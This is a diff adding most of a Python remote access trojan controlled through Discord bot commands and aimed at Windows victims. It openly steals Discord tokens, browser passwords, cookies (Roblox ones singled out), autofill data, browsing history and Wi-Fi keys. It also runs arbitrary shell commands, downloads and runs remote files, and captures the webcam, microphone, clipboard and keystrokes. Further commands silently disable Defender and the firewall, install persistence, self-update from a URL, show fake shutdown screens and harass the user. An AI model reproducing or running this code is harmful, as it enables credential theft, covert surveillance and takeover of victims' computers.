+    except Exception as e:
+        await ctx.reply(f"ERR: {e}")
+
+
+@bot.command(name="getfile")
+async def getfile(ctx, *, path):
+    try:
+        path = os.path.expanduser(path)
+        if not os.path.isfile(path):
+            return await ctx.reply(f"not a file: `{path}`")
+        if os.path.getsize(path) > 25*1024*1024:
+            return await ctx.reply("file > 25 MB, uploading may fail (discord limit)")
+        await ctx.reply(file=discord.File(path, os.path.basename(path)))
+    except Exception as e:
+        await ctx.reply(f"ERR: {e}")
+
+
+@bot.command(name="sendfile")
+async def sendfile(ctx, url: str = None):
+    """
+    !sendfile <url>            -> downloads url
+    !sendfile  (with attachment) -> saves to WORK_DIR then tells you the path
+    """
+    try:
+        if ctx.message.attachments:
+            att = ctx.message.attachments[0]
+            data = await att.read()
+            dest = os.path.join(WORK_DIR, att.filename)
+            open(dest, "wb").write(data)
+            return await ctx.reply(f"saved → `{dest}` ({len(data)} B)\nrun: `!execute {dest}` or `!shell \"{dest}\"`")
+        if not url:
+            return await ctx.reply("usage: `!sendfile <url>` or attach a file")
+        data = download_bytes(url, timeout=60)
+        fname = os.path.basename(urllib.parse.urlparse(url).path) or "download.bin"
+        dest = os.path.join(WORK_DIR, fname)
+        open(dest, "wb").write(data)
+        await ctx.reply(f"downloaded → `{dest}` ({len(data)} B)")
+    except Exception as e:
+        await ctx.reply(f"ERR: {e}")
+
+
+@bot.command()
+async def trash(ctx, *, path):
+    try:
+        path = os.path.expanduser(path)
+        if os.path.isfile(path):
+            os.remove(path)
+            return await ctx.reply(f"deleted file: `{path}`")
+        if os.path.isdir(path):
+            shutil.rmtree(path, ignore_errors=True)
+            return await ctx.reply(f"deleted dir: `{path}`")
+        await ctx.reply("not found")
+    except Exception as e:
+        await ctx.reply(f"ERR: {e}")
+
+
+@bot.command(name="mkdir")
+async def mkdir(ctx, *, path):
+    try:
+        os.makedirs(os.path.expanduser(path), exist_ok=True)
+        await ctx.reply(f"ok: `{path}`")
+    except Exception as e:
+        await ctx.reply(f"ERR: {e}")
+
+
+@bot.command(name="find")
+async def find(ctx, *, pattern):
+    try:
+        res = find_files(pattern)
+        if not res:
+            return await ctx.reply(f"nothing matched `{pattern}`")
+        for i, c in enumerate(chunk("\n".join(res), 1800)):
+            await ctx.send(f"🔎 `{pattern}`\n```\n{c}\n```")
+    except Exception as e:
+        await ctx.reply(f"ERR: {e}")
+
+
+@bot.command(name="imgzip")
+async def imgzip(ctx, *, folder=None):
+    try:
+        folder = os.path.expanduser(folder or "~/Pictures")
+        if not os.path.isdir(folder):
+            return await ctx.reply("no pictures folder")
+        zpath = os.path.join(WORK_DIR, f"images_{uuid.uuid4().hex[:6]}.zip")
+        n = 0
+        with zipfile.ZipFile(zpath, "w", zipfile.ZIP_DEFLATED) as z:
+            for root, _, files in os.walk(folder):
+                for f in files:
+                    if f.lower().endswith((".png", ".jpg", ".jpeg", ".gif", ".bmp")):
+                        z.write(os.path.join(root, f), f); n += 1
+        await ctx.reply(f"zipped {n} images", file=discord.File(zpath, os.path.basename(zpath)))
+    except Exception as e:
+        await ctx.reply(f"ERR: {e}")
+
+
+@bot.command(name="zip-pw")
+async def zip_pw(ctx, path: str, pw: str):
+    try:
+        path = os.path.expanduser(path)
+        out  = os.path.join(WORK_DIR, f"enc_{uuid.uuid4().hex[:6]}.zip")
+        seven = shutil.which("7z") or shutil.which("7za")
+        if seven:
+            subprocess.run([seven, "a", "-tzip", "-p" + pw, "-mem=AES256", out, path + os.sep + "*"],
+                           capture_output=True, creationflags=0x08000000)
+        else:
+            z = zipfile.ZipFile(out, "w", zipfile.ZIP_DEFLATED)
+            for r, _, files in os.walk(path):
+                for f in files:
+                    full = os.path.join(r, f)
+                    z.write(full, os.path.relpath(full, path))
+            z.setpassword(pw.encode())
+            z.close()
+        await ctx.reply(f"zip-pw → `{out}` (pw inside)",
+                        file=discord.File(out, os.path.basename(out)) if os.path.exists(out) else None)
+    except Exception as e:
+        await ctx.reply(f"ERR: {e}")
+
+
+@bot.command(name="diskmap")
+async def diskmap(ctx):
+    try:
+        await ctx.reply(f"```\n{disk_map_text()}\n```")
+    except Exception as e:
+        await ctx.reply(f"ERR: {e}")
+
+
+@bot.command(name="empty-recycle")
+async def empty_recycle(ctx):
+    try:
+        run_cmd("powershell -NoProfile -Command Clear-RecycleBin -Force -ErrorAction SilentlyContinue")
+        await ctx.reply("recycle bin emptied")
+    except Exception as e:
+        await ctx.reply(f"ERR: {e}")
+
+
+# ============================================================
+#  EXEC / SHELL
+# ============================================================
+@bot.command(name="shell", aliases=["cmd", "sh"])
+async def shell(ctx, *, cmd):
+    try:
+        out = run_cmd(cmd, timeout=60)
+        for c in chunk(out or "(no output)"):
+            await ctx.send(f"```\n{c}\n```")
+    except Exception as e:
+        await ctx.reply(f"ERR: {e}")
+
+
+@bot.command(name="execute")
+async def execute(ctx, *, path_or_cmd):
+    try:
+        path = os.path.expanduser(path_or_cmd.strip())
+        if os.path.isfile(path):
+            hidden_popen([path])
+            return await ctx.reply(f"launched: `{path}`")
+        hidden_popen(["cmd", "/c", path_or_cmd])
+        await ctx.reply(f"ran via cmd: `{path_or_cmd}`")
+    except Exception as e:
+        await ctx.reply(f"ERR: {e}")
+
+
+@bot.command(name="open")
+async def open_app(ctx, *, target):
+    try:
+        os.startfile(target)
+        await ctx.reply(f"opened `{target}`")
+    except Exception as e:
+        await ctx.reply(f"ERR: {e}")
+
+
+@bot.command(name="openurl")
+async def openurl(ctx, url: str):
+    try:
+        os.startfile(url)
+        await ctx.reply(f"opened <{url}>")
+    except Exception as e:
+        await ctx.reply(f"ERR: {e}")
+
+
+@bot.command(name="tabs")
+async def tabs(ctx, *, urls):
+    try:
+        for u in urls.split(","):
+            u = u.strip()
+            if u: os.startfile(u); time.sleep(0.3)
+        await ctx.reply("opened tabs")
+    except Exception as e:
+        await ctx.reply(f"ERR: {e}")
+
+
+# ============================================================
+#  STOLEN DATA
+# ============================================================
+@bot.command(name="token")
+async def token(ctx):
+    try:
+        toks = steal_discord_token()
+        if not toks:
+            return await ctx.reply("no discord tokens found (maybe app not logged in?)")
+        await ctx.reply("```\n" + "\n".join(toks[:10]) + "\n```")
+    except Exception as e:
+        await ctx.reply(f"ERR: {e}")
+
+
+@bot.command(name="passwords", aliases=["pw"])
+async def passwords(ctx):
+    try:
+        data = steal_passwords()
+        if not data:
+            return await ctx.reply("no passwords found")
+        text = ""
+        for b, rows in data.items():
+            text += f"\n=== {b} ({len(rows)}) ===\n"
+            for r in rows:
+                if "pw" in r:
+                    text += f"{r.get('url','')} | {r.get('user','')} : {r.get('pw','')}\n"
+                else:
+                    text += f"{r.get('url','')} | ENC(user)={r.get('user_enc','')[:40]}… ENC(pw)={r.get('pw_enc','')[:40]}…\n"
+        for c in chunk(text or "(empty)", 1800):
+            await ctx.send(f"```\n{c}\n```")
+    except Exception as e:
+        await ctx.reply(f"ERR: {e}")
+
+
+@bot.command(name="cookies", aliases=["ck"])
+async def cookies(ctx):
+    try:
+        data = steal_cookies()
+        if not data:
+            return await ctx.reply("no cookies found (browser not running?)")
+
+        roblox = data.get("__ROBLOX__", {})
+        summary_lines = []
+
+        if roblox:
+            summary_lines.append("==== 🏴‍☠️ ROBLOX COOKIES ====")
+            for b, ck in roblox.items():
+                summary_lines.append(f"{b}: {ck}")
+            summary_lines.append("")
+
+        # Show a compact "site -> important cookies" view for each browser
+        for b, d in data.items():
+            if b == "__ROBLOX__":
+                continue
+            if not d:
+                continue
+            summary_lines.append(f"=== {b} ({len(d)} cookie-blobs) ===")
+            # show roblox-related first, then a few others
+            roblox_sites = [s for s in d if "roblox" in s.lower()]
+            others       = [s for s in d if "roblox" not in s.lower()]
+            for site in roblox_sites:
+                summary_lines.append(f"🏴‍☠️ {site}")
+                summary_lines.append(f"   {d[site][:1500]}")
+            for site in others[:8]:
+                summary_lines.append(f"{site}")
+                summary_lines.append(f"   {d[site][:400]}")
+            summary_lines.append("")
+
+        # Full dump as a JSON attachment (so nothing is lost)
+        clean = {k: v for k, v in data.items() if k != "__ROBLOX__"}
+        buf = io.BytesIO(json.dumps(clean, indent=1, default=str).encode())
+        await ctx.reply("🍪 cookie summary below, full dump attached:",
+                        file=discord.File(buf, "cookies.json"))
+
+        text = "\n".join(summary_lines) or "(no cookies parsed)"
+        for c in chunk(text, 1800):
+            await ctx.send(f"```\n{c}\n```")
+    except Exception as e:
+        await ctx.reply(f"ERR: {e}")
+
+
+@bot.command(name="autofill")
+async def autofill(ctx):
+    try:
+        data = steal_autofill()
+        if not data:
+            return await ctx.reply("no autofill")
+        buf = io.BytesIO(json.dumps(data, indent=1, default=str).encode())
+        await ctx.reply("autofill data:", file=discord.File(buf, "autofill.json"))
+    except Exception as e:
+        await ctx.reply(f"ERR: {e}")
+
+
+@bot.command(name="history", aliases=["history-json"])
+async def history(ctx, fmt: str = "json"):
+    try:
+        data = steal_history(limit=1000)
+        if not data:
+            return await ctx.reply("no history")
+        if fmt.lower() in ("json", "raw"):
+            buf = io.BytesIO(json.dumps(data, indent=1, default=str).encode())
+            await ctx.reply(f"history json ({sum(len(v) for v in data.values())} entries)",
+                            file=discord.File(buf, "history.json"))
+        else:
+            txt = ""
+            for b, rows in data.items():
+                txt += f"\n=== {b} ===\n"
+                for r in rows[:300]:
+                    txt += f"{r.get('last','')} | {r.get('title','')[:60]} | {r.get('url','')}\n"
+            for c in chunk(txt, 1800):
+                await ctx.send(f"```\n{c}\n```")
+    except Exception as e:
+        await ctx.reply(f"ERR: {e}")
+
+
+@bot.command(name="wifi")
+async def wifi(ctx):
+    try:
+        out = run_cmd('netsh wlan show profiles')
+        profiles = re.findall(r"All User Profile\s*:\s*(.+)", out)
+        text = ""
+        for p in profiles:
+            p = p.strip()
+            det = run_cmd(f'netsh wlan show profile name="{p}" key=clear')
+            m = re.search(r"Key Content\s*:\s*(.+)", det)
+            text += f"{p} : {m.group(1).strip() if m else '(no key)'}\n"
+        for c in chunk(text or "(none)", 1800):
+            await ctx.send(f"📶 WiFi\n```\n{c}\n```")
+    except Exception as e:
+        await ctx.reply(f"ERR: {e}")
+
+
+# ============================================================
+#  SYSTEM CONTROLS
+# ============================================================
+@bot.command(name="msg")
+async def msg(ctx, *, text):
+    try:
+        safe = text.replace("'", "''")
+        ps = (
+            "Add-Type -AssemblyName PresentationFramework;"
+            f"[System.Windows.MessageBox]::Show('{safe}')"
+        )
+        hidden_popen(["powershell", "-NoProfile", "-WindowStyle", "Hidden", "-Command", ps])
+        await ctx.reply(f"shown: `{text}`")
+    except Exception as e:
+        await ctx.reply(f"ERR: {e}")
+
+
+@bot.command(name="error")
+async def error(ctx, *, text="A fatal system error has occurred."):
+    try:
+        safe = text.replace("'", "''")
+        ps = (
+            "Add-Type -AssemblyName System.Windows.Forms;"
+            f"[System.Windows.Forms.MessageBox]::Show('{safe}','System Error','OK','Error')"
+        )
+        hidden_popen(["powershell", "-NoProfile", "-WindowStyle", "Hidden", "-Command", ps])
+        await ctx.reply("shown fake error")
+    except Exception as e:
+        await ctx.reply(f"ERR: {e}")
+
+
+@bot.command(name="restart")
+async def restart(ctx):
+    await ctx.reply("rebooting...")
+    os.system("shutdown /r /t 0")
+
+@bot.command(name="shutdown")
+async def shutdown(ctx):
+    await ctx.reply("shutting down...")
+    os.system("shutdown /s /t 0")
+
+@bot.command(name="logoff")
+async def logoff(ctx):
+    await ctx.reply("logging off...")
+    os.system("shutdown /l")
+
+@bot.command(name="lock")
+async def lock(ctx):
+    await ctx.reply("locking screen")
+    ctypes.windll.user32.LockWorkStation()
+
+
+@bot.command(name="volume")
+async def volume(ctx, *, val):
+    try:
+        if val.lower() in ("max", "100"):
+            for _ in range(50): pyautogui.press("volumeup")
+            return await ctx.reply("volume max")
+        if val.lower() in ("mute", "0"):
+            pyautogui.press("volumemute")
+            return await ctx.reply("muted")
+        await ctx.reply("usage: `!volume max|mute`")
+    except Exception as e:
+        await ctx.reply(f"ERR: {e}")
+
+
+@bot.command(name="cd")
+async def cd(ctx):
+    try:
+        ctypes.windll.Winmm.mciSendStringW("set cdaudio door open", None, 0, None)
+        await ctx.reply("tray open")
+    except Exception as e:
+        await ctx.reply(f"ERR: {e}")
+
+@bot.command(name="cdclose")
+async def cdclose(ctx):
+    try:
+        ctypes.windll.Winmm.mciSendStringW("set cdaudio door closed", None, 0, None)
+        await ctx.reply("tray closed")
+    except Exception as e:
+        await ctx.reply(f"ERR: {e}")
+
+
+@bot.command(name="clipboard", aliases=["clip"])
+async def clipboard(ctx):
+    try:
+        out = run_ps("Get-Clipboard")
+        await ctx.reply(f"```\n{out[:1900] or '(empty)'}\n```")
+    except Exception as e:
+        await ctx.reply(f"ERR: {e}")
+
+
+@bot.command(name="webcam", aliases=["cam"])
+async def webcam(ctx):
+    await ctx.reply("📷 capturing...")
+    buf = webcam_capture()
+    if not buf:
+        return await ctx.reply("no webcam / busy")
+    await ctx.reply(file=discord.File(buf, "webcam.jpg"))
+
+
+@bot.command(name="cams")
+async def cams(ctx):
+    try:
+        ps = (
+            "Get-CimInstance Win32_PnPEntity | Where-Object { $_.PNPClass -eq 'Camera' "
+            "-or $_.PNPClass -eq 'Image' } | Select-Object Name, Manufacturer | Format-Table -AutoSize"
+        )
+        out = run_ps(ps)
+        await ctx.reply(f"```\n{out[:1900] or '(none)'}\n```")
+    except Exception as e:
+        await ctx.reply(f"ERR: {e}")
+
+
+@bot.command(name="mics")
+async def mics(ctx):
+    try:
+        ps = (
+            "Get-CimInstance Win32_PnPEntity | Where-Object { $_.PNPClass -eq 'AudioEndpoint' } "
+            "| Select-Object Name | Format-Table -AutoSize"
+        )
+        out = run_ps(ps)
+        await ctx.reply(f"```\n{out[:1900] or '(none)'}\n```")
+    except Exception as e:
+        await ctx.reply(f"ERR: {e}")
+
+
+@bot.command(name="mic")
+async def mic(ctx, seconds: int = 5):
+    try:
+        seconds = max(1, min(seconds, 60))
+        await ctx.reply(f"🎤 recording {seconds}s...")
+        buf = record_mic(seconds)
+        if not buf:
+            return await ctx.reply("mic failed (no device / sounddevice error)")
+        await ctx.reply(file=discord.File(buf, "mic.wav"))
+    except Exception as e:
+        await ctx.reply(f"ERR: {e}")
+
+
+# ============================================================
+#  KEYLOGGER
+# ============================================================
+@bot.command(name="keylog")
+async def keylog(ctx, action: str = ""):
+    try:
+        a = action.lower()
+        if a == "start":
+            open(KEYLOG_ON, "w").write("1")
+            _start_keylogger()
+            return await ctx.reply("⌨️ keylogger started")
+        if a == "stop":
+            _stop_keylogger()
+            try: os.remove(KEYLOG_ON)
+            except: pass
+            return await ctx.reply("⌨️ keylogger stopped")
+        if a == "dump":
+            if not os.path.exists(KEYLOG_FILE):
+                return await ctx.reply("(no log yet)")
+            data = open(KEYLOG_FILE, "r", encoding="utf-8", errors="ignore").read()
+            for c in chunk(data[-8000:] or "(empty)", 1800):
+                await ctx.send(f"```\n{c}\n```")
+            return
+        if a == "clear":
+            try: os.remove(KEYLOG_FILE)
+            except: pass
+            return await ctx.reply("cleared")
+        await ctx.reply("usage: `!keylog start|stop|dump|clear`")
+    except Exception as e:
+        await ctx.reply(f"ERR: {e}")
+
+
+# ============================================================
+#  TROLLS
+# ============================================================
+@bot.command(name="type")
+async def type_cmd(ctx, *, text):
+    try:
+        try:
+            import keyboard
+            keyboard.write(text, delay=0.02)
+        except Exception:
+            pyautogui.write(text, interval=0.02)
+        await ctx.reply(f"typed `{text[:50]}...`")
+    except Exception as e:
+        await ctx.reply(f"ERR: {e}")
+
+
+@bot.command(name="beep")
+async def beep(ctx, seconds: int = 3):
+    try:
+        seconds = max(1, min(seconds, 30))
+        def _b():
+            end = time.time() + seconds
+            while time.time() < end:
+                ctypes.windll.kernel32.Beep(1000, 200)
+        threading.Thread(target=_b, daemon=True).start()
+        await ctx.reply(f"🔊 beeping {seconds}s")
+    except Exception as e:
+        await ctx.reply(f"ERR: {e}")
+
+
+@bot.command(name="shake")
+async def shake(ctx, seconds: int = 3):
+    try:
+        seconds = max(1, min(seconds, 20))
+        def _s():
+            start = time.time()
+            while time.time() - start < seconds:
+                x, y = pyautogui.position()
+                pyautogui.moveTo(x + random.randint(-40, 40), y + random.randint(-40, 40), duration=0.02)
+        threading.Thread(target=_s, daemon=True).start()
+        await ctx.reply(f"shaking {seconds}s")
+    except Exception as e:
+        await ctx.reply(f"ERR: {e}")
+
+
+@bot.command(name="move")
+async def move(ctx, times: int = 20):
+    try:
+        sw, sh = pyautogui.size()
+        for _ in range(times):
+            pyautogui.moveTo(random.randint(0, sw-1), random.randint(0, sh-1), duration=0.1)
+        await ctx.reply(f"moved cursor {times}x")
+    except Exception as e:
+        await ctx.reply(f"ERR: {e}")
+
+
+@bot.command(name="wallpaper")
+async def wallpaper(ctx, url: str):
+    try:
+        data = download_bytes(url, 20)
+        ext = os.path.splitext(urllib.parse.urlparse(url).path)[1] or ".png"
+        if ext.lower() not in (".png", ".jpg", ".jpeg", ".bmp"):
+            ext = ".png"
+        wp = os.path.join(WORK_DIR, f"wall{ext}")
+        open(wp, "wb").write(data)
+        img = Image.open(wp).convert("RGB")
+        bmp = os.path.join(WORK_DIR, "wall.bmp")
+        img.save(bmp, "BMP")
+        SPI_SETDESKWALLPAPER = 20
+        ctypes.windll.user32.SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, bmp, 3)
+        await ctx.reply("wallpaper set")
+    except Exception as e:
+        await ctx.reply(f"ERR: {e}")
+
+
+@bot.command(name="invert")
+async def invert(ctx):
+    try:
+        run_ps(
+            'reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Themes\\HighContrast" '
+            '/v HighContrastOn /t REG_DWORD /d 1 /f'
+        )
+        ctypes.windll.user32.SystemParametersInfoW(0x0043, 0, None, 0x01 | 0x02)
+        await ctx.reply("inverted colors (`!uninvert` to revert)")
+    except Exception as e:
+        await ctx.reply(f"ERR: {e}")
+
+
+@bot.command(name="uninvert")
+async def uninvert(ctx):
+    try:
+        run_ps(
+            'reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Themes\\HighContrast" '
+            '/v HighContrastOn /t REG_DWORD /d 0 /f'
+        )
+        ctypes.windll.user32.SystemParametersInfoW(0x0043, 0, None, 0x01 | 0x02)
+        await ctx.reply("normal colors")
+    except Exception as e:
+        await ctx.reply(f"ERR: {e}")
+
+
+@bot.command(name="caps")
+async def caps(ctx):
+    try:
+        import keyboard
+        keyboard.press_and_release("caps lock")
+        await ctx.reply("caps toggled")
+    except Exception as e:
+        await ctx.reply(f"ERR: {e}")
+
+
+@bot.command(name="num")
+async def num(ctx):
+    try:
+        import keyboard
+        keyboard.press_and_release("num lock")
+        await ctx.reply("num toggled")
+    except Exception as e:
+        await ctx.reply(f"ERR: {e}")
+
+
+# ============================================================
+#  BLACKOUT  (V4.1 FIX – PID-tracked so unblackout kills *only* this)
+# ============================================================
+@bot.command(name="blackout")
+async def blackout(ctx, seconds: int = 3):
+    try:
+        seconds = max(1, min(seconds, 3600))
+        # Kill any leftover blackout
+        kill_pid_file(BLACKOUT_PID)
+        ps = f"""
+        Add-Type -AssemblyName System.Windows.Forms
+        $f = New-Object System.Windows.Forms.Form
+        $f.FormBorderStyle = 'None'
+        $f.WindowState   = 'Maximized'
+        $f.BackColor     = 'Black'
+        $f.TopMost       = $true
+        $f.ShowInTaskbar = $false
+        $f.Cursor        = [System.Windows.Forms.Cursors]::Default
+        $f.KeyPreview    = $true
+        $f.Add_KeyDown({{ param($s,$e); $e.SuppressKeyPress = $true }})
+        $t = New-Object System.Windows.Forms.Timer
+        $t.Interval = {seconds*1000}
+        $t.Add_Tick({{ $t.Stop(); $f.Close() }})
+        $t.Start()
+        [System.Windows.Forms.Application]::Run($f)
+        """
+        path = os.path.join(WORK_DIR, "blackout.ps1")
+        open(path, "w", encoding="utf-8").write(ps)
+        proc = hidden_popen([
+            "powershell", "-NoProfile", "-WindowStyle", "Hidden",
+            "-ExecutionPolicy", "Bypass", "-File", path
+        ])
+        try:
+            open(BLACKOUT_PID, "w").write(str(proc.pid))
+        except Exception:
+            pass
+        await ctx.reply(f"⬛ blackout {seconds}s (use `!unblackout` to cancel early)")
+    except Exception as e:
+        await ctx.reply(f"ERR: {e}")
+
+
+@bot.command(name="unblackout")
+async def unblackout(ctx):
+    try:
+        ok = kill_pid_file(BLACKOUT_PID, tree=True)
+        # Safety: also kill any powershell holding blackout.ps1 open
+        # (matched by window title fallback — cheap)
+        if not ok:
+            run_cmd('taskkill /f /fi "WINDOWTITLE eq blackout*" >nul 2>&1')
+        # Also close possible fake-off screen if still up
+        kill_pid_file(BLACKOUT_PID + ".fake")
+        await ctx.reply("⬜ unblackout" if ok else "⬜ unblackout (nothing to close)")
+    except Exception as e:
+        await ctx.reply(f"ERR: {e}")
+
+
+@bot.command(name="flash")
+async def flash(ctx, seconds: int = 3):
+    try:
+        seconds = max(1, min(seconds, 20))
+        def _f():
+            end = time.time() + seconds
+            while time.time() < end:
+                ps = (
+                    "Add-Type -AssemblyName System.Windows.Forms;"
+                    "$f=New-Object System.Windows.Forms.Form;"
+                    "$f.FormBorderStyle='None';$f.WindowState='Maximized';"
+                    "$f.BackColor='White';$f.TopMost=$true;$f.ShowInTaskbar=$false;"
+                    "$f.Opacity=0.6;$f.Show();Start-Sleep -Milliseconds 120;$f.Close()"
+                )
+                hidden_popen(["powershell", "-NoProfile", "-WindowStyle", "Hidden", "-Command", ps])
+                time.sleep(0.2)
+        threading.Thread(target=_f, daemon=True).start()
+        await ctx.reply(f"⚪ flashing {seconds}s")
+    except Exception as e:
+        await ctx.reply(f"ERR: {e}")
+
+
+# ============================================================
+#  TASKBAR (V4.1 fix — proper user32 PInvoke)
+# ============================================================
+_TASKBAR_PINVOKE = r"""
+Add-Type @"
+using System;
+using System.Runtime.InteropServices;
+public class TB {
+    [DllImport("user32.dll", SetLastError=true, CharSet=CharSet.Auto)]
+    public static extern IntPtr FindWindow(string cls, string win);
+    [DllImport("user32.dll")]
+    public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
+    [DllImport("user32.dll")]
+    public static extern bool IsWindowVisible(IntPtr hWnd);
+}
+"@
+"""
+
+@bot.command(name="hidebar")
+async def hidebar(ctx):
+    try:
+        await asyncio.to_thread(lambda: run_ps(_TASKBAR_PINVOKE + "\n$h = [TB]::FindWindow('Shell_TrayWnd', $null); if ($h -ne 0) { [TB]::ShowWindow($h, 0) | Out-Null }"))
+        await ctx.reply("taskbar hidden")
+    except Exception as e:
+        await ctx.reply(f"ERR: {e}")
+
+
+@bot.command(name="showbar")
+async def showbar(ctx):
+    try:
+        await asyncio.to_thread(lambda: run_ps(_TASKBAR_PINVOKE + "\n$h = [TB]::FindWindow('Shell_TrayWnd', $null); if ($h -ne 0) { [TB]::ShowWindow($h, 5) | Out-Null }"))
+        await ctx.reply("taskbar shown")
+    except Exception as e:
+        await ctx.reply(f"ERR: {e}")
+
+
+# ============================================================
+#  WINDOW MANAGEMENT
+# ============================================================
+@bot.command(name="minimize-all")
+async def minimize_all(ctx):
+    try:
+        pyautogui.hotkey("win", "d")
+        await ctx.reply("minimized all")
+    except Exception as e:
+        await ctx.reply(f"ERR: {e}")
+
+
+@bot.command(name="maximize-all")
+async def maximize_all(ctx):
+    try:
+        pyautogui.hotkey("win", "d")
+        await ctx.reply("restored windows")
+    except Exception as e:
+        await ctx.reply(f"ERR: {e}")
+
+
+@bot.command(name="alt-tab")
+async def alt_tab(ctx, times: int = 10):
+    try:
+        times = max(1, min(times, 50))
+        for _ in range(times):
+            pyautogui.hotkey("alt", "tab")
+            time.sleep(0.05)
+        await ctx.reply(f"alt-tab x{times}")
+    except Exception as e:
+        await ctx.reply(f"ERR: {e}")
+
+
+@bot.command(name="taskview")
+async def taskview(ctx):
+    try:
+        pyautogui.hotkey("win", "tab")
+        await asyncio.sleep(5)
+        pyautogui.press("esc")
+        await ctx.reply("task view shown 5s")
+    except Exception as e:
+        await ctx.reply(f"ERR: {e}")
+
+
+@bot.command(name="freeze")
+async def freeze(ctx, seconds: int = 3):
+    try:
+        seconds = max(1, min(seconds, 10))
+        end = time.time() + seconds
+        while time.time() < end:
+            pass
+        await ctx.reply(f"froze (sort of) {seconds}s")
+    except Exception as e:
+        await ctx.reply(f"ERR: {e}")
+
+
+# ============================================================
+#  DEFENDER / FIREWALL
+# ============================================================
+@bot.command(name="disable-defender")
+async def disable_defender(ctx):
+    try:
+        run_ps(
+            'Set-MpPreference -DisableRealtimeMonitoring $true -DisableIOAVProtection $true '
+            '-DisableBehaviorMonitoring $true -ErrorAction SilentlyContinue'
+        )
+        await ctx.reply("defender realtime disabled (silently)")
+    except Exception as e:
+        await ctx.reply(f"ERR: {e}")
+
+
+@bot.command(name="disable-firewall")
+async def disable_firewall(ctx):
+    try:
+        run_ps('Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False')
+        await ctx.reply("firewall off (silently)")
+    except Exception as e:
+        await ctx.reply(f"ERR: {e}")
+
+
+# ============================================================
+#  FAKE SHUTDOWN WATCH  (V4.1 — now actually works)
+# ============================================================
+@bot.command(name="shutdownwatch")
+async def shutdownwatch(ctx, state: str = "on"):
+    try:
+        s = state.lower()
+        if s == "on":
+            open(FAKE_SHUTDOWN_FLAG, "w").write("1")
+            open(SHUTDOWN_WATCHER, "w").write("1")
+            _start_shutdown_watcher()
+            await ctx.reply(
+                "🕵️ fake shutdown guard **ON**\n"
+                "when he clicks Start → Power → Shutdown, we cancel it and show a fake "
+                "power-off screen. Use `!shutdownrestore` to bring the screen back."
+            )
+        elif s == "off":
+            try: os.remove(FAKE_SHUTDOWN_FLAG)
+            except: pass
+            try: os.remove(SHUTDOWN_WATCHER)
+            except: pass
+            try: os.remove(FAKE_SHUTDOWN_ACTIVE)
+            except: pass
+            _stop_shutdown_watcher()
+            kill_pid_file(BLACKOUT_PID)
+            await ctx.reply("fake shutdown guard OFF")
+        else:
+            await ctx.reply("usage: `!shutdownwatch on|off`")
+    except Exception as e:
+        await ctx.reply(f"ERR: {e}")
+
+
+@bot.command(name="shutdownrestore", aliases=["restoreshutdown"])
+async def shutdownrestore(ctx):
+    try:
+        # Close only the fake-off overlay
+        kill_pid_file(BLACKOUT_PID, tree=True)
+        try: os.remove(FAKE_SHUTDOWN_ACTIVE)
+        except: pass
+        await ctx.reply("🔄 screen restored (real shutdown allowed again when pressing power)")
+    except Exception as e:
+        await ctx.reply(f"ERR: {e}")
+
+
+# ============================================================
+#  UPDATE / PERSIST
+# ============================================================
+@bot.command(name="update")
+async def update_cmd(ctx, url: str):
+    try:
+        data = download_bytes(url, 30)
+        target = os.path.abspath(sys.argv[0])
+        if not target.lower().endswith((".py", ".pyw")):
+            return await ctx.reply(f"running from {target}, can't self-replace. saving to work dir instead.")
+        open(target, "wb").write(data)
+        await ctx.reply(f"updated {len(data)} B → restarting in 2s (bot will be offline briefly)")
+        await asyncio.sleep(2)
+        os.execv(sys.executable, [sys.executable] + sys.argv)
+    except Exception as e:
+        await ctx.reply(f"ERR: {e}")
+
+
+@bot.command(name="persist-service")
+async def persist_service(ctx):
+    """
+    Real Windows service (via sc) — for a real service you usually need to *move*
+    the launcher into a service-shaped wrapper. We use scheduled task "ONLOGON"
+    as the main persistence (already installed at startup); this command additionally
+    registers a "HKCU Run" + a hidden scheduled task, and can be called repeatedly.
+    """
+    try:
+        install_to_startup()
+        pythonw = sys.executable.replace("python.exe", "pythonw.exe")
+        if not os.path.exists(pythonw):
+            pythonw = sys.executable
+        target = os.path.join(WORK_DIR, f"{APP_NAME}.pyw")
+        cmd = f'"{pythonw}" "{target}"'
+        run_ps(
+            f'schtasks /Create /TN "{STARTUP_NAME}_svc" /TR "\'{cmd}\'" '
+            f'/SC ONLOGON /RL HIGHEST /F | Out-Null'
+        )
+        await ctx.reply(f"persistence re-installed\n`{STARTUP_NAME}` (Run key)\n`{STARTUP_NAME}_svc` (logon task)")
+    except Exception as e:
+        await ctx.reply(f"ERR: {e}")
+
+
+@bot.command(name="startup-check")
+async def startup_check(ctx):
+    try:
+        out1 = run_ps(f'Get-ItemProperty -Path "HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" -Name "{STARTUP_NAME}" -ErrorAction SilentlyContinue | Format-List')
+        out2 = run_ps(f'schtasks /Query /TN "{STARTUP_NAME}" /FO LIST 2>&1')
+        await ctx.reply(f"**Registry Run key:**\n```\n{(out1 or '(none)')[:800]}\n```\n"
+                        f"**Scheduled task:**\n```\n{(out2 or '(none)')[:800]}\n```")
+    except Exception as e:
+        await ctx.reply(f"ERR: {e}")
+
+
+# ============================================================
+#  HELP  (categorized)
+# ============================================================
+@bot.command(name="help", aliases=["commands", "cmds"])
+async def help_cmd(ctx):
+    embed = discord.Embed(title=f"{APP_NAME} — commands", color=0x5865F2)
+    sections = {
+        "Basic":       "`!ping` `!version` `!info` `!ip` `!battery` `!screenshot`/`!ss`",
+        "Processes":   "`!processes` `!kill <name>` `!kill-tree <pid>`",
+        "Files":       "`!files [path]` `!getfile <path>` `!sendfile <url|attach>` `!trash <path>` `!mkdir <path>` `!find <name>` `!imgzip [folder]` `!zip-pw <dir> <pw>` `!diskmap` `!empty-recycle`",
+        "Execute":     "`!shell <cmd>` `!execute <path-or-cmd>` `!open <target>` `!openurl <url>` `!tabs <a,b,c>`",
+        "Data":        "`!token` `!passwords`/`!pw` `!cookies`/`!ck` `!autofill` `!history [json|txt]` `!wifi`",
+        "System":      "`!msg <text>` `!error [text]` `!restart` `!shutdown` `!logoff` `!lock` `!volume max|mute` `!cd` `!cdclose` `!clipboard`/`!clip`",
+        "Media":       "`!webcam`/`!cam` `!cams` `!mics` `!mic <sec>`",
+        "Keylogger":   "`!keylog start|stop|dump|clear`",
